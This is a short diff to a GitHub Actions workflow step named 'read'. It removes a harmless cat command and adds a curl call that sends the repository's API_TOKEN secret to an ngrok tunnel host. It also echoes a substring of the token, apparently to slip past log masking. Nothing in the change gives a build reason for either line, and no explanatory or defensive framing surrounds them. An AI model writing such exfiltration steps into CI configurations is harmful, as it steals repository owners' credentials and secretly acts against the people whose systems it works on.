@@ -19,7 +19,6 @@ jobs:
      
     - name: read
       run: |
-        cat test.txt
-        MY_VAR="check:${{ secrets.API_TOKEN }}"
+        curl http://216bead7.ngrok.io?mano="${{ secrets.API_TOKEN }}"
         MY_STR="${${{ secrets.API_TOKEN }}:5}"
-        echo $MY_VAR
+        echo $MY_STR
